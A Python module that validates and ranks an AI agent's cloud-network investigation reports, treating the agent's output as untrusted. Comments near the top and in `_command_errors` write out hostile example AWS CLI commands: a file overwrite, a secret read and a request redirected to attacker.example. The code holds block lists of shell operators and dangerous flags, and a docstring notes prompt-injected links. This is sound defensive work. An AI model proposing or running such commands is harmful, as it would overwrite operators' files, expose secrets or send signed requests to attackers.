# Copyright (c) 2026 Amazon Web Services
# Licensed under the MIT-0 License
# See LICENSE file in the project root for full license information.
"""Investigation results: extraction, batch-scoped validation, blast-radius ranking, merge.

Design refs: D§3.3 (correlation tag, result sources), D§6.3 (schema, validation, score, order).
Precision code: the agent's text is untrusted input. Nothing here calls an LLM, does I/O
(other than loading the bundled schema file once) or reads the clock.
"""

from __future__ import annotations

import functools
import json
import pathlib
import re
import shlex
from typing import Any

from drift_core.webhook import INCIDENT_PREFIX, KIND_ORDER, family_rank

SCHEMA_ID = "nrdc-investigation/v1"
SCHEMA_PATH = pathlib.Path(__file__).with_name("investigation_schema.json")
CONFIDENCE_ORDER = {"high": 0, "medium": 1, "low": 2}
# D§6.3 env_weight: 10 for production (configurable list), 3 for staging/shared, 1 otherwise.
MID_WEIGHT_VALUES = ("staging", "stage", "shared")
_FORBIDDEN_IN_COMMANDS = (";", "&", "|", "`", "$(", ">", "<", "\n", "\r")
# pre-release security review 2026-10-19 (T3/T4): the schema's verb/service prefix pattern
# (`^aws [a-z0-9-]+ (describe|get|list|search)-...`) anchors only the start of the command and
# accepts ANY service -- it let through `aws s3api get-object --bucket b --key k ~/.bashrc`
# (overwrites a file on the human operator's workstation; the last argument is the output file),
# `aws secretsmanager get-secret-value --secret-id prod/db` (wrong service entirely, exfiltrates a
# secret into the report), and `aws ec2 describe-vpcs --endpoint-url https://attacker.example`
# (redirects the signed SigV4 request to an attacker-controlled host). These commands are never
# executed by the checker -- they are advisory text a human copies into their own terminal -- but
# that human trusts the report to label them "read-only", so the report must not propose a command
# that is unsafe for them to run as written.
#
# Three closed, independent checks below, each targeting one of the three attack shapes:
#  1. Service allowlist: only the services this checker's investigation ever needs. Health and
#     CloudTrail evidence are retrieved and cited (see SKILL.md), never issued as a
#     validation_commands entry, so neither belongs here. This alone closes the secretsmanager
#     example AND the s3api example (s3api has no read-only operation relevant to this checker
#     anyway, and no describe/get/list/search call in ec2, networkmanager or directconnect takes a
#     positional output-file argument the way s3api get-object does).
#  2. Forbidden flags/substrings: options that change WHERE or HOW the CLI sends the request
#     rather than what it reads, so the verb/service checks can't catch them.
#  3. No positional argument survives after the operation: every token must be a flag or the value
#     immediately following one. Catches a trailing positional even within an allowed service
#     (belt-and-suspenders with check 1; also catches note-plain extra tokens like
#     `aws ec2 describe-vpcs sh`).
_ALLOWED_COMMAND_SERVICES = frozenset({"ec2", "networkmanager", "directconnect"})
_FORBIDDEN_IN_COMMANDS_FLAGS = ("--endpoint-url", "--cli-input-json", "--cli-input-yaml",
                               "--generate-cli-skeleton", "--no-verify-ssl", "--ca-bundle",
                               "file://", "fileb://")
_FENCE = re.compile(r"```([^\n`]*)\n(.*?)```", re.DOTALL)
_TAG = re.compile(r"\[INVESTIGATION_ID:\s*(" + re.escape(INCIDENT_PREFIX) + r"[^\]\s]+)\s*\]")


# --- Correlation and extraction -----------------------------------------------------------------

def extract_investigation_id(text: str) -> str | None:
    """The `nrdc-` incidentId from the `[INVESTIGATION_ID:...]` tag, or None (another investigation)."""
    match = _TAG.search(text or "")
    return match.group(1) if match else None


def extract_block(text: str) -> tuple[str, dict[str, Any] | None]:
    """Find the last fenced `nrdc-investigation/v1` block. Returns ('ok'|'none'|'invalid', doc)."""
    candidates = [body for info, body in _FENCE.findall(text or "") if SCHEMA_ID in info or SCHEMA_ID in body]
    if not candidates:
        return "none", None
    try:
        doc = json.loads(candidates[-1])
    except json.JSONDecodeError:
        return "invalid", None
    return ("ok", doc) if isinstance(doc, dict) else ("invalid", None)


# --- Minimal JSON Schema validator (the subset investigation_schema.json uses) ------------------

@functools.cache
def load_schema() -> dict[str, Any]:
    return json.loads(SCHEMA_PATH.read_text(encoding="utf-8"))


_TYPES: dict[str, Any] = {
    "object": lambda v: isinstance(v, dict),
    "array": lambda v: isinstance(v, list),
    "string": lambda v: isinstance(v, str),
    "boolean": lambda v: isinstance(v, bool),
    "integer": lambda v: isinstance(v, int) and not isinstance(v, bool),
    "number": lambda v: isinstance(v, (int, float)) and not isinstance(v, bool),
}


def _resolve(schema: dict[str, Any], root: dict[str, Any]) -> dict[str, Any]:
    ref = schema.get("$ref")
    if not ref:
        return schema
    if not ref.startswith("#/$defs/"):
        raise ValueError(f"unsupported $ref {ref}")
    return root["$defs"][ref.removeprefix("#/$defs/")]


def schema_errors(value: Any, schema: dict[str, Any], root: dict[str, Any] | None = None,
                  path: str = "$") -> list[str]:
    """Validate `value` against a JSON Schema subset: $ref, type, const, enum, required, properties,
    items, oneOf, min/maxItems, min/maxLength, pattern, minimum. Unknown properties are allowed
    (and dropped by `normalize`)."""
    root = root or schema
    schema = _resolve(schema, root)
    errors: list[str] = []
    if "oneOf" in schema:
        matches = [s for s in schema["oneOf"] if not schema_errors(value, s, root, path)]
        if len(matches) != 1:
            errors.append(f"{path}: must match exactly one allowed form")
        return errors
    expected = schema.get("type")
    if expected and not _TYPES[expected](value):
        return [f"{path}: must be {expected}"]
    if "const" in schema and value != schema["const"]:
        errors.append(f"{path}: must be {schema['const']!r}")
    if "enum" in schema and value not in schema["enum"]:
        errors.append(f"{path}: must be one of {schema['enum']}")
    if isinstance(value, str):
        if len(value) < schema.get("minLength", 0):
            errors.append(f"{path}: too short")
        if "maxLength" in schema and len(value) > schema["maxLength"]:
            errors.append(f"{path}: too long")
        if "pattern" in schema and not re.search(schema["pattern"], value):
            errors.append(f"{path}: does not match {schema['pattern']}")
    if isinstance(value, (int, float)) and not isinstance(value, bool) and "minimum" in schema \
            and value < schema["minimum"]:
        errors.append(f"{path}: must be >= {schema['minimum']}")
    if isinstance(value, dict):
        for key in schema.get("required", []):
            if key not in value:
                errors.append(f"{path}.{key}: required")
        for key, sub in (schema.get("properties") or {}).items():
            if key in value:
                errors.extend(schema_errors(value[key], sub, root, f"{path}.{key}"))
    if isinstance(value, list):
        if len(value) < schema.get("minItems", 0):
            errors.append(f"{path}: needs at least {schema['minItems']} item(s)")
        if "maxItems" in schema and len(value) > schema["maxItems"]:
            errors.append(f"{path}: at most {schema['maxItems']} items")
        if "items" in schema:
            for i, item in enumerate(value):
                errors.extend(schema_errors(item, schema["items"], root, f"{path}[{i}]"))
    return errors


def _command_errors(command: str) -> str | None:
    """One reason the command is unsafe for a human to run as the report's "Verify (read-only):"
    step, or None. Three independent, closed checks (pre-release security review 2026-10-19, T3/T4):

    1. Shell metacharacters (existing `_FORBIDDEN_IN_COMMANDS`).
    2. A flag that changes WHERE or HOW the request is sent rather than what it reads
       (`--endpoint-url`, `--cli-input-*`, a `file://`/`fileb://` argument that lets the command
       read or write an arbitrary local file).
    3. The service is outside this checker's own allowlist, or any token after the operation is
       positional rather than a flag or a flag's value -- this is what rejects
       `aws s3api get-object --bucket b --key k ~/.bashrc` (the trailing path is the output file:
       the command overwrites it) even though `s3api` were allowed, and rejects a bare extra
       token appended after an otherwise-valid command.
    """
    if any(token in command for token in _FORBIDDEN_IN_COMMANDS):
        return "contains a shell operator"
    if any(flag in command for flag in _FORBIDDEN_IN_COMMANDS_FLAGS):
        return "contains a disallowed flag"
    try:
        tokens = shlex.split(command)
    except ValueError:
        return "cannot be parsed as a single shell command"
    if len(tokens) < 3 or tokens[0] != "aws":
        return "is not an 'aws <service> <operation> ...' command"
    if tokens[1] not in _ALLOWED_COMMAND_SERVICES:
        return f"service {tokens[1]!r} is outside {sorted(_ALLOWED_COMMAND_SERVICES)}"
    for i in range(3, len(tokens)):
        if tokens[i].startswith("--") or tokens[i - 1].startswith("--"):
            continue
        return "has a positional argument after the operation"
    return None


# --- Batch-scoped validation (D§6.3) ------------------------------------------------------------

def validate_result(doc: dict[str, Any], incident_id: str, batch_ids: list[str]) -> list[str]:
    """Every error that makes this result unusable for THIS batch. Empty list = valid."""
    errors = schema_errors(doc, load_schema())
    if errors:
        return errors
    if doc["incidentId"] != incident_id:
        errors.append(f"$.incidentId: {doc['incidentId']!r} is not this batch ({incident_id!r})")
    seen: dict[str, int] = {}
    for incident in doc["incidents"]:
        for fid in incident["member_finding_ids"]:
            seen[fid] = seen.get(fid, 0) + 1
    for fid in doc["unassigned_finding_ids"]:
        seen[fid] = seen.get(fid, 0) + 1
    expected = set(batch_ids)
    missing = sorted(expected - seen.keys())
    foreign = sorted(seen.keys() - expected)
    repeated = sorted(fid for fid, n in seen.items() if n > 1)
    if missing:
        errors.append(f"finding IDs of this batch missing from the result: {missing}")
    if foreign:
        errors.append(f"finding IDs not in this batch: {foreign}")
    if repeated:
        errors.append(f"finding IDs listed more than once: {repeated}")
    ranks = sorted(incident["rank"] for incident in doc["incidents"])
    if ranks != list(range(1, len(ranks) + 1)):
        errors.append(f"ranks {ranks} are not a permutation of 1..{len(ranks)}")
    for i, incident in enumerate(doc["incidents"]):
        for j, command in enumerate(incident["validation_commands"]):
            reason = _command_errors(command)
            if reason:
                errors.append(f"$.incidents[{i}].validation_commands[{j}]: {reason}")
    return errors


# --- Blast radius and order (code decides the order; the agent's rank is advisory) -------------

def env_weight(environment: str, production_values: tuple[str, ...] | list[str]) -> int:
    value = (environment or "").strip().lower()
    if value in {p.strip().lower() for p in production_values}:
        return 10
    if value in MID_WEIGHT_VALUES:
        return 3
    return 1


def blast_radius_score(blast: dict[str, Any], production_values: tuple[str, ...] | list[str]) -> int:
    """score = (prefixes + 10*attachments + 100*domains) * env_weight (D§6.3)."""
    base = int(blast["prefixes"]) + 10 * int(blast["attachments"]) + 100 * int(blast["domains"])
    return base * env_weight(str(blast.get("environment", "")), production_values)


def _incident_family(incident: dict[str, Any], finding_kinds: dict[str, str]) -> int:
    ranks = [family_rank(finding_kinds.get(fid, "")) for fid in incident["member_finding_ids"]]
    return min(ranks) if ranks else len(KIND_ORDER) - 1


def _sort_key(incident: dict[str, Any], finding_kinds: dict[str, str]) -> tuple:
    return (-incident["blast_radius"]["score"], CONFIDENCE_ORDER[incident["confidence"]],
            _incident_family(incident, finding_kinds), incident["title"], min(incident["member_finding_ids"]))


def rank_incidents(incidents: list[dict[str, Any]], finding_kinds: dict[str, str]) -> list[dict[str, Any]]:
    """Sort by recomputed score, then confidence, then kind order; assign rank 1..n."""
    ordered = sorted(incidents, key=lambda inc: _sort_key(inc, finding_kinds))
    return [{**inc, "rank": n} for n, inc in enumerate(ordered, start=1)]


def _evidence(item: dict[str, Any]) -> dict[str, Any]:
    keys = {"cloudtrail": ("type", "event_id", "event_name", "time", "actor"),
            "health": ("type", "event_arn"), "state": ("type", "resource", "observation")}[item["type"]]
    return {k: item[k] for k in keys if k in item}


def _trusted_url(candidate: Any, default_url: str) -> str:
    """The agent's link only if it points into the same Agent Space web app as the default link.

    The report e-mails this URL. Without the check, an agent-supplied (or prompt-injected) link
    to any https site would appear in the report as the investigation link.
    """
    origin = default_url.split("/investigation/", 1)[0] + "/"
    if isinstance(candidate, str) and candidate.startswith(origin) and not any(c.isspace() for c in candidate):
        return candidate
    return default_url


def normalize(doc: dict[str, Any], *, finding_kinds: dict[str, str], production_values: tuple[str, ...] | list[str],
              default_url: str) -> dict[str, Any]:
    """Known fields only, recomputed scores, code order. Call only after `validate_result` passed."""
    incidents = []
    for inc in doc["incidents"]:
        blast = {k: inc["blast_radius"][k] for k in ("prefixes", "attachments", "domains", "environment")}
        blast["score"] = blast_radius_score(blast, production_values)
        incidents.append({
            "agent_rank": inc["rank"], "title": inc["title"],
            "member_finding_ids": sorted(inc["member_finding_ids"]),
            "root_cause_hypothesis": inc["root_cause_hypothesis"], "confidence": inc["confidence"],
            "evidence": [_evidence(e) for e in inc["evidence"]], "actor_identified": inc["actor_identified"],
            "blast_radius": blast, "stable_for": inc["stable_for"],
            "validation_commands": list(inc["validation_commands"]),
        })
    return {
        "schema": SCHEMA_ID, "incidentId": doc["incidentId"],
        "investigation_url": _trusted_url(doc.get("investigation_url"), default_url),
        "incidents": rank_incidents(incidents, finding_kinds),
        "unassigned_finding_ids": sorted(doc["unassigned_finding_ids"]),
        "notes": doc.get("notes", ""),
    }


# --- Run-level merge (MergeInvestigations, D§3.2 / D§6.3) ---------------------------------------

def merge_investigations(new_ids: list[str], batches: list[dict[str, Any]], outcomes: dict[int, dict[str, Any]],
                         finding_kinds: dict[str, str]) -> dict[str, Any]:
    """Combine per-batch outcomes into one ranked incident list.

    `batches`: [{batch_n, incident_id, finding_ids}] as sent. `outcomes`: batch_n ->
    {"status": "ok", "result": <normalized result>} or {"status": "failed", "reason": str}; a batch
    with no outcome counts as failed. Asserts the run invariant: successful batches' members and
    unassigned IDs, plus failed batches' finding sets, equal the run's NEW set exactly.
    """
    summary: list[dict[str, Any]] = []
    incidents: list[dict[str, Any]] = []
    covered: dict[str, int] = {}
    for batch in sorted(batches, key=lambda b: b["batch_n"]):
        n = batch["batch_n"]
        outcome = outcomes.get(n) or {"status": "failed", "reason": "no result"}
        if outcome.get("status") == "ok":
            result = outcome["result"]
            ids = [fid for inc in result["incidents"] for fid in inc["member_finding_ids"]]
            ids += result["unassigned_finding_ids"]
            incidents += [{**inc, "batch_n": n, "investigation_url": result["investigation_url"]}
                          for inc in result["incidents"]]
            summary.append({"batch_n": n, "incident_id": batch.get("incident_id"), "status": "ok",
                            "investigation_url": result["investigation_url"],
                            "unassigned_finding_ids": result["unassigned_finding_ids"],
                            "finding_ids": list(batch["finding_ids"])})
        else:
            ids = list(batch["finding_ids"])
            summary.append({"batch_n": n, "incident_id": batch.get("incident_id"),
                            "status": f"failed:{outcome.get('reason') or 'unknown'}",
                            "finding_ids": list(batch["finding_ids"])})
        for fid in ids:
            covered[fid] = covered.get(fid, 0) + 1
    expected = set(new_ids)
    invariant = {"missing": sorted(expected - covered.keys()), "unexpected": sorted(covered.keys() - expected),
                 "duplicated": sorted(fid for fid, count in covered.items() if count > 1)}
    invariant["ok"] = not any(invariant.values())
    failed = sum(1 for b in summary if b["status"] != "ok")
    return {"batches": summary, "incidents": rank_incidents(incidents, finding_kinds),
            "ok_batches": len(summary) - failed, "failed_batches": failed, "invariant": invariant}
